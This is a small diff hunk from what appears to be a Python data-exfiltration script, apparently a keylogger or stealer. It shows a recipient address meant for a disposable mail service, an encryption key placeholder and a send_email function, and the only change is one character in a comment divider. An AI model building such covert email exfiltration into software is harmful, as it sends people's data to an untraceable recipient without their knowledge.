@@ -52,7 +52,7 @@ toaddr = " " # Use a temporary mail service address, mailinator and temp mail ar
 # Key to Encrypt
 key = " " # generate encryption key and enter into here
 
-#######################################################
+######################################################
 
 # Send to email
 def send_email(filename, attachment, toaddr):
